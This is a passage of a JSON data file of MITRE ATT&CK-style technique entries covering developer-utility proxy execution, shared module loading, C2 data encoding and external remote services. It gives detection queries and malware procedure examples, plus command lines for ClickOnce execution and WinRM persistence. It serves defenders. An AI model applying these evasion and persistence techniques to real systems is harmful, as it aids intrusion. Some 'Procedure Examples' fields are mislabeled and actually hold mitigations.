      "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system. Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data."
    ],
    "Procedure Examples": [
      "Agent Teslacan access the victim’s webcam and record video.[2][3]",
      "AsyncRATcan record screen content on targeted systems.[4]",
      "Bandookhas modules that are capable of capturing video from a victim's webcam.[5]",
      "Clamblingcan record screen content in AVI format.[6][7]",
      "Cobian RAThas a feature to access the webcam on the victim’s machine.[8]",
      "ConnectWisecan record video on remote hosts.[9]",
      "Crimsoncan capture webcam video on targeted systems.[10][11]",
      "DarkCometcan access the victim’s webcam to take pictures.[12][13]",
      "Derusbiis capable of capturing video.[14]",
      "Ember Bearhas exfiltrated images from compromised IP cameras.[15]",
      "Empirecan capture webcam data on Windows and macOS systems.[16]",
      "EvilGrabhas the capability to capture video from a victim machine.[17]",
      "FIN7created a custom video recording capability that could be used to monitor operations in the victim's environment.[18][19]",
      "Imminent Monitorhas a remote webcam monitoring capability.[20][21]",
      "InvisiMolecan remotely activate the victim’s webcam to capture content.[22][23]",
      "jRAThas the capability to capture video from a webcam.[24][25]",
      "Kazuarcaptures images from the webcam.[26]",
      "Machetetakes photos from the computer’s web camera.[27][28][29]",
      "NanoCorecan access the victim's webcam and capture data.[30][31]",
      "njRATcan access the victim's webcam.[32][33]",
      "ObliqueRATcan capture images from webcams on compromised hosts.[34]",
      "PcSharecan capture camera video as part of its collection process.[35]",
      "PoetRAThas used a Python tool named Bewmac to record the webcam on compromised hosts.[36]",
      "Pupycan access a connected webcam and capture pictures.[37]",
      "QuasarRATcan perform webcam viewing.[38][39]",
      "Quick Assistallows for the remote administrator to view the interactive session of the running machine, including full screen activity.[40][41]",
      "Remcoscan access a system’s webcam and take pictures.[42]",
      "Revenge RAThas the ability to access the webcam.[43][44]",
      "SDBbothas the ability to record video on a compromised host.[45][46]",
      "Silencehas been observed making videos of victims to observe bank employees day to day activities.[47][48]",
      "T9000uses the Skype API to record audio and video calls. It writes encrypted data to%APPDATA%\\Intel\\Skype.[49]",
      "TajMahalhas the ability to capture webcam video.[50]",
      "WarzoneRATcan access the webcam on a victim's machine.[51][52]",
      "ZxShellhas a command to perform video device spying.[53]"
    ]
  },
  "T1127": {
    "Name": "Trusted Developer Utilities Proxy Execution",
    "Description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.[1][2][3][4]These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.[5]However, adversaries may leverage \"reputation hijacking\" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveragingTrusted Developer Utilities Proxy Executionto run their malicious code, adversaries may bypass Smart App Control protections.[6]",
    "Detects": [
      "Monitor executed commands and arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.",
      "Monitor trusted developer utility activity with unsigned module loads.",
      "Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious. Use process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious.",
      "Evaluate Event Tracing for Windows (ETW) telemetry associated with the execution of developer utilities."
    ],
    "Procedure Examples": [
      "Specific developer utilities may not be necessary within a given environment and should be removed if not used.",
      "Certain developer utilities should be blocked or restricted if not required.",
      "Consider disabling software installation or execution from the internet via developer utilities."
    ]
  },
  "T1127.001": {
    "Name": "Trusted Developer Utilities Proxy Execution:MSBuild",
    "Description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.[1]Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.[1][2]MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.[3]",
    "Detects": [
      "Monitor executed commands and arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.",
      "Monitor for newly executed processes of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity.Trusted developer utilities such as MSBuild may be leveraged to run malicious code with elevated privileges. This analytic looks for any instances of msbuild.exe, which will execute any C# code placed within a given XML document; and msxsl.exe, which processes xsl transformation specifications for XML files and will execute a variaty of scripting languages contained within the XSL file. Both of these executables are rarely used outside of Visual Studio.Analytic 1 - MSBuild and msxsl(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")(Image=\"C:\\Program Files (x86)\\Microsoft Visual Studio\\\\bin\\MSBuild.exe\" OR Image=\"C:\\Windows\\Microsoft.NET\\Framework\\msbuild.exe\" OR Image=\"C:\\users\\\\appdata\\roaming\\microsoft\\msxsl.exe\") ParentImage!=\"\\Microsoft Visual Studio*\")"
    ],
    "Procedure Examples": [
      "Empirecan use built-in modules to abuse trusted utilities like MSBuild.exe.[4]",
      "DuringFrankenstein, the threat actors used MSbuild to execute an actor-created file.[5]",
      "A version ofPlugXloads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.[6]"
    ]
  },
  "T1127.002": {
    "Name": "Trusted Developer Utilities Proxy Execution:ClickOnce",
    "Description": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.[1]ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.[2]Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.[3]As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.ClickOnce may be abused in a number of ways. For example, an adversary may rely onUser Execution. When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.[4]Adversaries may also abuse ClickOnce to execute malware via aRundll32script using the commandrundll32.exe dfshim.dll,ShOpenVerbApplication1.[5]Additionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e.,Registry Run Keys / Startup Folder).[1][6]",
    "Detects": [
      "When executed from the command line, rundll32 is used to call the ClickOnce API functions (ex:rundll32.exe dfshim.dll,ShOpenVerbApplication file.appref-ms).",
      "Monitor dfsvc.exe child process activity with unsigned module loads, as well as activity associated with dfshim.dll. Compare with baseline of ClickOne activity to whitelist applications with valid business use-cases.[2]",
      "Monitor for newly executed child processes of dfsvc.exe that may be indicative of malicious ClickOnce applications.",
      "Evaluate Event Tracing for Windows (ETW) telemetry associated with ClickOnce deployment execution."
    ],
    "Procedure Examples": [
      "Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.[7]",
      "Disable ClickOnce installations from the internet using the following registry key:\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled[4][8]ClickOnce may not be necessary within an environment and should be disabled if not being used.",
      "Disable ClickOnce installations from the internet using the following registry key:\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled[4]"
    ]
  },
  "T1127.003": {
    "Name": "Trusted Developer Utilities Proxy Execution:JamPlus",
    "Description": "Adversaries may useJamPlusto proxy the execution of a malicious script.JamPlusis a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.[1]Adversaries may abuse theJamPlusbuild utility to execute malicious scripts via a.jamfile, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.[2][3]",
    "Detects": [
      "Monitor for abnormal use of JamPlus, including the JamPlus Builder, that may be indicative of malicious use."
    ],
    "Procedure Examples": [
      "JamPlus may not be necessary within a given environment and should be removed if not used.",
      "Consider blocking or restricting JamPlus if not required."
    ]
  },
  "T1129": {
    "Name": "Shared Modules",
    "Description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e.,Native API).Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides indlfcn.hin functions such asdlopenanddlsym. Although macOS can execute.sofiles, common practice uses.dylibfiles.[1][2][3][4]The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides inNTDLL.dlland is part of the WindowsNative APIwhich is called from functions likeLoadLibraryat run time.[5]",
    "Detects": [
      "Monitor shared module loading, focusing on .dll, .so, and .dylib files, and look for suspicious paths or abnormal module loads that deviate from system norms.Limiting module loads to trusted directories, such as%SystemRoot%and%ProgramFiles%on Windows, may protect against module loads from unsafe paths.",
      "Monitor API calls such as LoadLibrary (Windows) or dlopen (Linux/macOS) that load shared modules."
    ],
    "Procedure Examples": [
      "Astarothuses the LoadLibraryExW() function to load additional modules.[6]",
      "Attor's dispatcher can execute additional plugins by loading the respective DLLs.[7]",
      "BLINDINGCANhas loaded and executed DLLs in memory during runtime on a victim machine.[8]",
      "BOOSTWRITEhas used the DWriteCreateFactory() function to load additional modules.[9]",
      "Bumblebeecan useLoadLibraryto attempt to execute GdiPlus.dll.[10]",
      "DarkWatchmancan load DLLs.[11]",
      "Dtrackcontains a function that callsLoadLibraryandGetProcAddress.[12]",
      "Eburyis executed through hooking the keyutils.so file used by legitimate versions ofOpenSSHandlibcurl.[13]",
      "FoggyWeb's loader can call theload()function to load theFoggyWebdll into an Application Domain on a compromised AD FS server.[14]",
      "gh0st RATcan load DLLs into memory.[15]",
      "Hydraqcreates a backdoor through which remote attackers can load and call DLL functions.[16][17]",
      "KillDiskloads and executes functions from a DLL.[18]",
      "LightSpy's main executable and module.dylibbinaries are loaded using a combination ofdlopen()to load the library,_objc_getClass()to retrieve the class definition, and_objec_msgSend()to invoke/execute the specified method in the loaded class.[19]",
      "Metamorfohad used AutoIt to load and execute the DLL payload.[20]",
      "For network communications,OSX_OCEANLOTUS.Dloads a dynamic library (.dylibfile) usingdlopen()and obtains a function pointer to execute within that shared library usingdlsym().[4]",
      "PipeMonhas used call toLoadLibraryto load its installer.PipeMonloads its modules using reflective loading or custom shellcode.[21]",
      "PUNCHBUGGYcan load a DLL using the LoadLibrary API.[22]",
      "RotaJakirouses dynamically linked shared libraries (.sofiles) to execute additional functionality usingdlopen()anddlsym().[3]",
      "Stuxnetcalls LoadLibrary then executes exports from a DLL.[23]",
      "TajMahalhas the ability to inject theLoadLibrarycall template DLL into running processes.[24]",
      "VersaMemrelied on the Java Instrumentation API and Javassist to dynamically modify Java code existing in memory.[25]"
    ]
  },
  "T1132": {
    "Name": "Data Encoding",
    "Description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.[1][2]Some data encoding systems may also result in data compression, such as gzip.",
    "Detects": [
      "Monitor for network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols and packet contents."
    ],
    "Procedure Examples": [
      "After encrypting C2 data,BADNEWSconverts it into a hexadecimal representation and then encodes it into base64.[3]",
      "H1N1obfuscates C2 traffic with an altered version of base64.[4]",
      "Linux Rabbitsends the payload from the C2 server as an encoded URL parameter.[5]",
      "Mythicprovides various transform functions to encode and/or randomize C2 data.[6]",
      "Ursnifhas used encoded data in HTTP URLs for C2.[7]",
      "Velvet Antsent commands to compromised F5 BIG-IP devices in an encoded format requiring a passkey before interpretation and execution.[8]"
    ]
  },
  "T1132.001": {
    "Name": "Data Encoding:Standard Encoding",
    "Description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.[1][2]Some data encoding systems may also result in data compression, such as gzip.",
    "Detects": [
      "Monitor for network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used."
    ],
    "Procedure Examples": [
      "C2 traffic fromADVSTORESHELLis encrypted, then encoded with Base64 encoding.[3]",
      "AnAPT19HTTP malware variant used Base64 to encode communications to the C2 server.[4]",
      "APT33has used base64 to encode command and control traffic.[5]",
      "APT42has encoded C2 traffic with Base64.[6]",
      "Astarothencodes data using Base64 before sending it to the C2 server.[7]",
      "AutoIt backdoorhas sent a C2 response that was base64-encoded.[8]",
      "BabySharkhas encoded data usingcertutilbefore exfiltration.[9]",
      "SomeBackdoor.Oldreasamples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.[10]",
      "BADNEWSencodes C2 traffic with base64.[8][11][12]",
      "Bisonalhas encoded binary data with Base64 and ASCII.[13][14]",
      "BLINDINGCANhas encoded its C2 traffic with Base64.[15]",
      "SeveralBRONZE BUTLERtools encode data with base64 when posting it to a C2 server.[16]",
      "BS2005uses Base64 encoding for communication in the message body of an HTTP request.[17]",
      "Bumblebeehas the ability to base64 encode C2 server responses.[18]",
      "Carbanakencodes the message body of HTTP traffic with Base64.[19][20]",
      "Chaeshas used Base64 to encode C2 communications.[21]",
      "CharmPowercan send additional modules over C2 encoded with base64.[22]",
      "ChChescan encode C2 data with a custom technique that utilizes Base64.[23][24]",
      "Cobalt Strikecan use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic.[25]",
      "Cobian RATobfuscates communications with the C2 server using Base64 encoding.[26]",
      "CORESHELLC2 messages are Base64-encoded.[27]",
      "CreepySnailcan use Base64 to encode its C2 traffic.[28]",
      "DarkWatchmanencodes data using hexadecimal representation before sending it to the C2 server.[29]",
      "Daserfuses custom base64 encoding to obfuscate HTTP traffic.[16]",
      "Denisencodes the data sent to the server in Base64.[30]",
      "Dipsindencodes C2 traffic with base64.[31]",
      "DnsSystemcan Base64 encode data sent to C2.[32]",
      "down_newhas the ability to base64 encode C2 communications.[33]",
      "Eburyhas encoded C2 traffic in hexadecimal format.[34]",
      "Eliseexfiltrates data using cookie values that are Base64-encoded.[35]",
      "Emotethas used Google’s Protobufs to serialize data sent to and from the C2 server.[36]Additionally,Emotethas used Base64 to encode data before sending to the C2 server.[37]",
      "SomeFelismussamples use a custom method for C2 traffic that utilizes Base64.[38]",
      "Flagprohas encoded bidirectional data communications between a target system and C2 server using Base64.[39]",
      "Fysbiscan use Base64 to encode its C2 traffic.[40]",
      "gh0st RAThas used Zlib to compress C2 communications data before encrypting it.[41]",
      "GLASSTOKENhas hexadecimal and Base64 encoded C2 content.[42]",
      "Gomiruses Base64-encoded content in HTTP communications to command and control infrastructure.[43]",
      "Gootloadercan retrieve a Base64 encoded stager from C2.[44]",
      "GrimAgentcan base64 encode C2 replies.[45]",
      "HAFNIUMhas used ASCII encoding for C2 traffic.[46]",
      "For C2 over HTTP,Helminthencodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS,Helminthconverts ASCII characters into their hexadecimal values and sends the data in cleartext.[47]",
      "HOPLIGHThas utilized Zlib compression to obfuscate the communications payload.[48]",
      "Ixesheuses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.[49][50]",
      "AJHUHUGITvariant encodes C2 POST data base64.[51]",
      "DuringJuicy Mix,OilRigused a VBS script to send the Base64-encoded name of the compromised computer to C2.[52]",
      "Kapekautilizes JSON objects to send and receive information from command and control nodes.[53]",
      "Kazuarencodes communications to the C2 server in Base64.[54]",
      "Kesselhas exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.[55]",
      "Kevincan Base32 encode chunks of output files during exfiltration.[56]",
      "KONNIhas used a custom base64 key to encode stolen data before exfiltration.[57]",
      "Latrodectushas Base64-encoded the message body of a HTTP request sent to C2.[58][59]",
      "ALazarus Groupmalware sample encodes data with base64.[60]",
      "LockBit 3.0can Base64-encode C2 communication.[61]",
      "LunarWebcan use Base64 encoding to obfuscate C2 commands.[62]",
      "Machetehas used base64 encoding.[63]",
      "Mafaldacan encode data using Base64 prior to exfiltration.[64]",
      "Mangocan receive Base64-encoded commands from C2.[52]",
      "Manjusakacommunication includes a client-created session cookie with base64-encoded information representing information from the victim system.[65]",
      "MechaFlounderhas the ability to use base16 encoded strings in C2.[66]",
      "Mis-Typeuses Base64 encoding for C2 traffic.[67]",
      "Misdatnetwork traffic is Base64-encoded plaintext.[67]",
      "Mongallcan use Base64 to encode information sent to its C2.[68]",
      "More_eggshas used basE91 encoding, along with encryption, for C2 communication.[69]",
      "Morican use Base64 encoded JSON libraries used in C2.[70]",
      "MuddyWaterhas used tools to encode C2 communications including Base64 encoding.[71][72]",
      "njRATuses Base64 encoding for C2 traffic.[73]",
      "Octopushas encoded C2 communications in Base64.[74]",
      "Okrumhas used base64 to encode C2 communication.[75]",
      "OopsIEencodes data in hexadecimal format over the C2 channel.[76]",
      "OSX_OCEANLOTUS.Dhas usedzlibto compress all data after 0x52 for the custom TCP C2 protocol.[77]",
      "Patchworkused Base64 to encode C2 traffic.[78]",
      "Pikabotuses base64 encoding in conjunction with symmetric encryption mechanisms to obfuscate command and control communications.[79][80]",
      "PingPullcan encode C2 traffic with Base64.[81]",
      "Responses from thePisloaderC2 server are base32-encoded.[82]",
      "PowerShowerhas the ability to encode C2 communications with base64 encoding.[83][84]",
      "POWERSTATSencoded C2 traffic with base64.[85]",
      "POWRUNERcan use base64 encoded C2 communications.[86]",
      "Prikormkaencodes C2 traffic with Base64.[87]",
      "PULSECHECKcan base-64 encode encrypted data sent through C2.[88]",
      "QakBotcan Base64 encode system information sent to C2.[89][90]",
      "QUADAGENTencodes C2 communications with base64.[91]",
      "QUIETCANARYcan base64 encode C2 communications.[92]",
      "Ramsayhas used base64 to encode its C2 traffic.[93]",
      "RDATcan communicate with the C2 via base32-encoded subdomains.[94]",
      "Revenge RATuses Base64 to encode information sent to the C2 server.[95]",
      "RogueRobinbase64 encodes strings that are sent to the C2 over its DNS tunnel.[96]",
      "RotaJakirouses ZLIB Compression to compresses data sent to the C2 server in thepayloadsection network communication packet.[97]",
      "S-Typeuses Base64 encoding for C2 traffic.[67]",
      "Saint Bothas used Base64 to encode its C2 communications.[98]",
      "Samuraican base64 encode data sent in C2 communications prior to its encryption.[99]",
      "Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.[100]",
      "Sardoniccan encode client ID data in 32 uppercase hex characters and transfer to the actor-controlled C2 server.[101]",
      "SeaDukeC2 traffic is base64-encoded.[102]",
      "SideTwisthas used Base64 for encoded C2 traffic.[103]",
      "SLIGHTPULSEcan base64 encode all incoming and outgoing C2 messages.[88]",
      "Slivercan use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.[104]",
      "SMOKEDHAMhas encoded its C2 traffic with Base64.[105]",
      "Solarcan Base64-encode and gzip compress C2 communications including command outputs.[52]",
      "Sparkhas encoded communications with the C2 server with base64.[106]",
      "SpeakUpencodes C&C communication using Base64.[107]",
      "Squirrelwafflehas encoded its communications to C2 servers using Base64.[108]",
      "STARWHALEhas the ability to hex-encode collected data from an infected host.[70]",
      "STEADYPULSEcan transmit URL encoded data over C2.[88]",
      "StrelaStealerutilizes a hard-coded XOR key to encrypt the content of HTTP POST requests to command and control infrastructure.[109]",
      "Stuxnettransforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.[110]",
      "SUNBURSTused Base64 encoding in its C2 traffic.[111]",
      "SysUpdatehas used Base64 to encode its C2 traffic.[112]",
      "TA551has used encoded ASCII text for initial C2 communications.[113]",
      "TAMECAThas encoded C2 traffic with Base64.[6]",
      "Torismahas encoded C2 communications with Base64.[114]",
      "TrickBotcan Base64-encode C2 commands.[115]",
      "Troll Stealerperforms XOR encryption and Base64 encoding of data prior to sending to command and control infrastructure.[116]",
      "Tropic Trooperhas used base64 encoding to hide command strings delivered from the C2.[117]",
      "Valakhas returned C2 data as encoded ASCII.[113]",
      "WARPWIREcan Base64 encode captured credentials withbtoa()prior to sending to C2.[118]",
      "WellMesshas used Base64 encoding to uniquely identify communication to and from the C2.[119]",
      "WIREFIREcan Base64 encode process output sent to C2.[118]",
      "xCaonhas used Base64 to encode its C2 traffic.[120]",
      "Zebrocyhas used URL/Percent Encoding on data exfiltrated via HTTP POST requests.[121]"
    ]
  },
  "T1132.002": {
    "Name": "Data Encoding:Non-Standard Encoding",
    "Description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.[1][2]",
    "Detects": [
      "Monitor for network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used."
    ],
    "Procedure Examples": [
      "Newer variants ofBACKSPACEwill encode C2 communications with a custom system.[3]",
      "Bankshotencodes commands from the control server using a range of characters and gzip.[4]",
      "CHIMNEYSWEEPcan use a custom Base64 alphabet for encoding C2.[5]",
      "Cyclops Blinkcan use a custom binary scheme to encode messages with specific commands and parameters to be executed.[6]",
      "InvisiMolecan use a modified base32 encoding to encode data within the subdomain of C2 requests.[7]",
      "Neo-reGeorgcan use modified Base64 encoding to obfuscate communications.[8]",
      "NightClubhas used a non-standard encoding in DNS tunneling removing any=from the result of base64 encoding, and replacing/characters with-sand+characters with-p.[9]",
      "Ninjacan encode C2 communications with a base64 algorithm using a custom alphabet.[10]",
      "OceanSaltcan encode data with a NOT operation before sending the data to the control server.[11]",
      "PowGoopcan use a modified Base64 encoding mechanism to send data to and from the C2 server.[12]",
      "RDATcan communicate with the C2 via subdomains that utilize base64 with character substitutions.[13]",
      "ShadowPadhas encoded data as readable Latin characters.[14]",
      "Small Sievecan use a custom hex byte swapping encoding scheme to obfuscate tasking traffic.[15][16]",
      "Uroburoscan use a custom base62 and a de-facto base32 encoding that uses digits 0-9 and lowercase letters a-z in C2 communications.[17]"
    ]
  },
  "T1133": {
    "Name": "External Remote Services",
    "Description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such asWindows Remote ManagementandVNCcan also be used externally.[1]Access toValid Accountsto use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.[2]Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.[3][4]",
    "Detects": [
      "When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.Analytic 1 - Failed connection attempts from remote servicesindex=\"remote_access_logs\" sourcetype=\"vpn_logs\" OR sourcetype=\"rdp_logs\" OR sourcetype=\"citrix_logs\"| stats count by src_ip, dest_ip, user, status, _time| where status=\"failed\" AND count > 5| table _time, user, src_ip, dest_ip, status",
      "Follow best practices for detecting adversary use ofValid Accountsfor authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.",
      "Monitor for newly constructed network connections that may use Valid Accounts to access and/or persist within a network using External Remote Services. Use of External Remote Services may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using External Remote Services.Analytic 1 - Connections to common remote service portsindex=network sourcetype=\"network_traffic\"| stats count by src_ip, dest_ip, dest_port, protocol| where dest_port=22 OR dest_port=3389 OR dest_port=8443| table _time, src_ip, dest_ip, dest_port, protocol",
      "Analyze traffic to detect anomalous requests, API usage, or data transfers. Anomalous content within network traffic, such as unexpected API calls, file transfers, or large data uploads.Unusual commands or payloads transmitted through remote service channels.Analytic 1 - Large data transfers over remote service connectionsindex=network sourcetype=\"network_packet_capture\"| stats count by src_ip, dest_ip, data_size, protocol| where data_size > 1000000| table _time, src_ip, dest_ip, data_size, protocol",
      "Track the flow of traffic to/from external sources to detect anomalies or unusual patterns. Unusual patterns or high-volume traffic flows between internal and external systems.Connections to/from known malicious IPs or geolocations.Analytic 1 - High-Volume data transfersindex=network sourcetype=\"network_traffic_flow\"| stats count by src_ip, dest_ip, bytes_sent, bytes_received| where bytes_sent > 1000000 OR bytes_received > 1000000| table _time, src_ip, dest_ip, bytes_sent, bytes_received"
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teaminstalled a modified Dropbear SSH client as the backdoor to target systems.[5]",
      "Akirauses compromised VPN accounts for initial access to victim networks.[6]",
      "APT18actors leverage legitimate credentials to log into external remote services.[7]",
      "APT28has usedTorand a variety of commercial VPN services to route brute force authentication attempts.[8]",
      "APT29has used compromised identities to access networks via VPNs and Citrix.[9][10]",
      "APT41compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.[11]",
      "ArcaneDoorused WebVPN sessions commonly associated with Clientless SSLVPN services to communicate to compromised devices.[12]",
      "DuringC0027,Scattered Spiderused Citrix and VPNs to persist in compromised environments.[13]",
      "During theC0032campaign,TEMP.Velesused VPN access to persist in the victim environment.[14]",
      "Chimerahas used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.[15][16]",
      "DuringCostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.[17]",
      "Dokiwas executed through an open Docker daemon API port.[18]",
      "Dragonflyhas used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.[19][20]",
      "Ember Bearhave used VPNs both for initial access to victim environments and for persistence within them following compromise.[21]",
      "FIN13has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).[22]",
      "FIN5has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.[23][24][25]",
      "GALLIUMhas used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.[26][27]",
      "GOLD SOUTHFIELDhas used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.[28]",
      "Hildegardwas executed through an unsecure kubelet that allowed anonymous access to the victim environment.[4]",
      "Ke3changhas gained access through VPNs including with compromised accounts and stolen VPN certificates.[29][30]",
      "Kimsukyhas used RDP to establish persistence.[31]",
      "Kinsingwas executed in an Ubuntu container deployed via an open Docker daemon API.[32]",
      "LAPSUS$has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix.[33][34]",
      "Leviathanhas used external remote services such as virtual private networks (VPN) to gain initial access.[35]",
      "Linux Rabbitattempts to gain access to the server via SSH.[36]",
      "Mafaldacan establish an SSH connection from a compromised host to a server.[37]",
      "DuringNight Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[38]",
      "OilRiguses remote services such as VPN, Citrix, or OWA to persist in an environment.[39]",
      "DuringOperation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command:cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}.[40]",
      "DuringOperation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN.[41]",
      "Playhas used Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.[42][43]",
      "Sandworm Teamhas used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network.Sandworm Teamhas also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.[44][45][46][47]",
      "Scattered Spiderhas leveraged legitimate remote management tools to maintain persistent access.[48]",
      "Sea Turtlehas used external-facing SSH to achieve initial access to the IT environments of victim organizations.[49]",
      "For theSolarWinds Compromise,APT29used compromised identities to access networks via SSH, VPNs, and other remote access tools.[50][51]",
      "TeamTNThas used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments.[52][53]TeamTNThas also targeted exposed kubelets for Kubernetes environments.[4]",
      "Threat Group-3390actors look for and use VPN profiles during an operation to access the network using external VPN services.[54]Threat Group-3390has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[55]",
      "Velvet Anthas leveraged access to internet-facing remote services to compromise and retain access to victim environments.[56]",
      "Volt Typhoonhas used VPNs to connect to victim environments and enable post-exploitation actions.[57]",
      "Wizard Spiderhas accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.[58]"
    ]
  },
  "T1134": {
    "Name": "Access Token Manipulation",
